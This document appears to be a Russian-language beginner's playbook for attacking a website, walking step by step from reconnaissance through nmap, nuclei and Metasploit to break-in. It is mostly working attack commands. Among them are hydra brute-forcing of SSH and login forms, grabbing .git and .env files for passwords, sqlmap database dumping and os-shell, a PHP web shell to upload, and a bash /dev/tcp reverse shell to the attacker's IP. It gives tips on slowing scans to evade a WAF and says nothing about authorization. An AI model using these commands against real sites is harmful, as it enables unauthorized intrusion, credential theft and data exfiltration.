Шаг 1 Сайт живой?

Проверяем, что сайт вообще открывается снаружи. Если нет — остальное бессмысленно.

curl -I https://TARGET
Что это значит (объяснение)

curl — программа, которая «дёргает» страницу и показывает, что ответил сервер. -I — попросить только служебные заголовки, без самой страницы: быстро и не грузит сайт.

Что смотреть — первую строку ответа:

  • 200 OK — страница есть, всё нормально
  • 301 / 302 — страница переехала на другой адрес, тоже нормально
  • 403 — сервер говорит «не пущу», но он живой
  • 000 — ответа не было: нет такого домена или сервер лежит
Развилки:
→ сайт живой → Шаг 2
→ доступ «мягко» закрыт, но сервер жив → всё равно Шаг 2
→ СТОП. Домен не существует или опечатка в адресе.

Шаг 2 Какие порты открыты

Порты — это «двери» сервера. Веб обычно на 80/443, но рядом часто открыто что-то попроще.

nmap -sV -sC -T4 --top-ports 1000 TARGET
Что это значит (объяснение)

nmap — сканер: стучится в порты и сообщает, какие открыты и что за ними стоит.

  • --top-ports 1000 — проверить 1000 самых популярных портов (быстро); -p- — все 65535 (долго)
  • -sV (Version) — не просто «дверь открыта», а какая программа и какой версии
  • -sC — запустить готовые проверочные скрипты
  • -T (Timing) — скорость: 0=очень тихо, 2=вежливо, 4=быстро, 5=максимально быстро (и заметно)

Что смотреть: строки со словом open — это открытые двери.

Развилки по выводу:
→ Шаг 3 (обычный веб-путь)
→ ветка SSH: hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://TARGET
→ ftp TARGET, логин anonymous, пароль пустой
→ mysql -h TARGET -u root -p (пробуй пустой пароль, root, toor)
→ открой http://TARGET:8080 в браузере — часто там панель управления
→ СТОП. Сайт за фильтром или на другом IP.

Шаг 3 Есть защита WAF?

WAF — «охранник», который распознаёт атаки и банит. От его наличия зависит, насколько громко можно сканировать.

wafw00f -a https://TARGET
Что это значит (объяснение)

wafw00f — определяет WAF по тому, как сервер отвечает. -a (all) — проверить все известные подписи охранников, а не только первые.

Что смотреть: is behind Cloudflare/Akamai… = охрана есть; No WAF detected = охраны нет.

Это не отдельный путь, а режим:

  • WAF есть → тихо: -T2, -t 10, -c 25, sqlmap --level 2 --risk 1
  • WAF нет → можно громче: -T4, -t 50, -c 100
Развилки:
→ тихий режим: -T2, -t 10, -c 25, -rl 50, sqlmap --level 2 --risk 1
→ громкий режим: -T4, -t 50, -c 100, -rl 150

Шаг 4 Что за сайт внутри

Сайты собраны на «движках» (CMS). У каждого свои дыры и свой инструмент проверки.

whatweb -a 3 https://TARGET
Что это значит (объяснение)

whatweb — «опознаватель» технологий: смотрит заголовки, cookie, HTML-теги и говорит, на чём сделан сайт.

-a (aggressiveness) — агрессивность: 1 = один тихий запрос, 2 = чуть больше, 3 = агрессивно, точнее всего (но заметно в логах), 4 = heavy, может задеть сайт.

Что смотреть: название движка, версии, IP-адрес сервера.

Развилки по выводу:
wpscan --url https://TARGET --enumerate ap,at,u --api-token <ТОКЕН>
# ap = все плагины, at = все темы, u = пользователи
→ нашёл [!] Title: … [CVE-…] → searchsploit <имя_плагина> → Шаг 8а 
joomscan -u https://TARGET
searchsploit joomla
→ нашёл админку /administrator/ → Шаг 9 · нашёл CVE → Шаг 8а 
droopescan scan drupal -u https://TARGET
searchsploit drupal
→ CMS не определена. У React/Vue-сайтов папок почти нет → Шаг 5, затем сразу Шаг 10 (Burp).
→ searchsploit <сервер> <версия> + в Шаге 7б добавь тег технологии

Шаг 5 Известные слабости (nikto)

Автоматический «чек-лист» на тысячи мелких ошибок: забытые файлы, бэкапы, тестовые страницы.

nikto -h https://TARGET -Tuning 12389
Что это значит (объяснение)

nikto делает много мелких проверок и выдаёт список подозрительного.

-Tuning — какие категории включить: 1 интересные файлы, 2 ошибки настроек, 3 утечка информации, 4 инъекции, 8 выполнение команд, 9 SQL-инъекции. 6 = DoS-тесты (нагрузка) — на живом сайте лучше не включать.

Что смотреть: строки, начинающиеся с + — это находки.

Развилки:
→ открой в браузере, запомни путь → потом Шаг 9 (hydra)
→ скачай: wget https://TARGET/backup.zip — внутри бывают пароли и исходники
→ открой в браузере: подсказывает CMS и версию
→ /phpinfo.php показывает пути и версии; открытая загрузка = кандидат на шелл
→ чисто → Шаг 6

Шаг 6 Скрытые папки

На сайте часто есть страницы без ссылок в меню: /admin, /backup, /test. Их находят перебором имён.

gobuster dir -u https://TARGET \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,bak,zip -t 10
Что это значит (объяснение)
  • dir — режим поиска каталогов
  • -w — словарь: текстовый файл, где по одному имени в строке (admin, backup, test…)
  • -x — дописывать расширения: index + .php = index.php
  • -t — сколько проверок одновременно: 10=вежливо, 50=быстро, 100=сайт может «икнуть»

Читаем только по коду ответа:

  • 200 — страница есть, открывай
  • 301 / 302 — есть (переехала)
  • 403 — есть, но не пускает
  • 404 — не существует
Развилки:
→ Шаг 9 (hydra)
git-dumper https://TARGET/.git ./src   # исходники
curl https://TARGET/.env              # пароли БД
→ после входа в панель пробуй залить туда shell.php
→ Шаг 7

Шаг 7 Шаблоны уязвимостей (nuclei) → Metasploit

База из тысяч готовых проверок конкретных CVE и ошибок настройки. Один запуск — тысячи проверок.

# 7а — общий прогон
nuclei -update-templates
nuclei -u https://TARGET \
  -severity low,medium,high,critical -c 50 -rl 100 -o nuclei.txt

# 7б — прицельный (тег технологии из Шага 4)
nuclei -u https://TARGET \
  -tags wordpress,joomla,drupal,apache,nginx,cve,misconfig \
  -severity low,medium,high,critical
Что это значит (объяснение)
  • -severity — важность: info (просто инфо) → low → medium → high → critical (самое опасное)
  • -tags — запускать только шаблоны с этими метками
  • -c — сколько шаблонов параллельно (25 тихо, 100 быстро)
  • -rl — запросов в секунду

Что смотреть: строки с [critical], [high], [CVE-XXXX], [rce], [sqli] — каждая такая строка = реальная найденная дыра и адрес, где она живёт.

▼ Что нашёл nuclei → команда Metasploit

Metasploit · [имя уязвимости из nuclei]

msfconsole -q
msf6> search <cve-номер или название из nuclei>
msf6> use exploit/<путь из поиска>
msf6> set RHOSTS IP_ЦЕЛИ
msf6> set RPORT 443          ← 80 если http
msf6> set SSL true           ← true для https
msf6> set TARGETURI /

msf6> set LPORT 4444
msf6> run

Шаг 8 SQL-инъекция (sqlmap)

Сайт берёт данные из базы. Если параметр адреса подставляется в запрос без проверки — можно вытащить всю базу.

sqlmap -u "https://TARGET/page.php?id=1" \
  --batch --level 3 --risk 1 --dbs
Что это значит (объяснение)
  • Нужен адрес с параметром (?id=1, ?page=2) — это и есть «входная точка»
  • --batch — не задавать вопросы, отвечать по умолчанию
  • --level — сколько техник пробовать: 1=минимум, 3=норма, 5=максимум (долго)
  • --risk — насколько рискованно: 1=безопасно, 2=средне, 3=может изменить данные
  • --dbs — показать список баз данных

Что смотреть: is injectable = инъекция есть.

Развилки:

[SQL Injection — подтверждена]

sqlmap -u "URL" --batch -D <база> -T users --dump
sqlmap -u "URL" --batch --os-shell

После os-shell> — обратный шелл:

nc -lvnp 4444                                    ← у себя
os-shell> bash -c "bash -i >& /dev/tcp/<твой_IP>/4444 0>&1"
# сохрани запрос из Burp в req.txt:
sqlmap -r req.txt --batch --level 3 --risk 1 --dbs
→ тоже пусто → Шаг 9

Шаг 9 Вход в панель (hydra)

Форма входа найдена — часто пароль стандартный или из словаря.

hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET \
  http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid" -t 4
Что это значит (объяснение)

Сначала руками: admin:admin, admin:password, admin:123456. Потом в браузере (F12 → Network) смотрим имена полей и текст ошибки при неудаче.

  • -l — один логин (маленькая L); -L — файл со списком логинов
  • -P — словарь паролей (большая P; маленькая -p = один пароль)
  • http-post-form — тип атаки «заполняем веб-форму»
  • строка в кавычках = путь : поля : F= текст при неудачном входе
  • -t — сколько попыток одновременно (4=вежливо, 64=громко)
Развилки:
→ зашёл в панель. Есть загрузка файла → залей <?php system($_GET['cmd']); ?> и открой ?cmd=whoami. Есть редактор шаблона → вставь туда же.
→ другие логины (administrator, root, admin1) или Шаг 10

Шаг 10 Всё дало 0 — руками (Burp)

Инструменты ищут только известные шаблоны. Логические ошибки находит человек.

burpsuite    # в браузере прокси 127.0.0.1:8080
Что это значит (объяснение)

Burp Suite — «перехватчик»: показывает каждый запрос, который браузер отправляет, и даёт его править перед отправкой.

Что искать:

  • скрытые параметры: ?debug=1, ?admin=true
  • подмена чужих данных (IDOR): user_id=5 → 1
  • JWT в cookie, подмена цены в корзине
  • отсутствие проверки на сервере (проверка только в браузере)

Шаг 8а Доступ получен — обратный шелл

Сервер сам подключается к твоей машине, и ты получаешь командную строку на нём.

nc -lvnp 4444                           ← слушать у себя

# на сервере:
bash -i >& /dev/tcp/ТВОЙ_IP/4444 0>&1

# появилось www-data@…$ → получилось:
whoami
id
sudo -l                                  ← что можно от root
Что это значит (объяснение)

nc (netcat) — «телефон»: ждёт входящее соединение на порту. -l=слушать, -v=подробно, -n=без DNS, -p=номер порта.

Затем на сервере запускается команда, которая «звонит» тебе через /dev/tcp — так bash умеет делать TCP-соединение без сторонних программ.

Когда видишь приглашение www-data@server:~$ — ты внутри. Дальше sudo -l показывает, какие команды можно запускать от root.
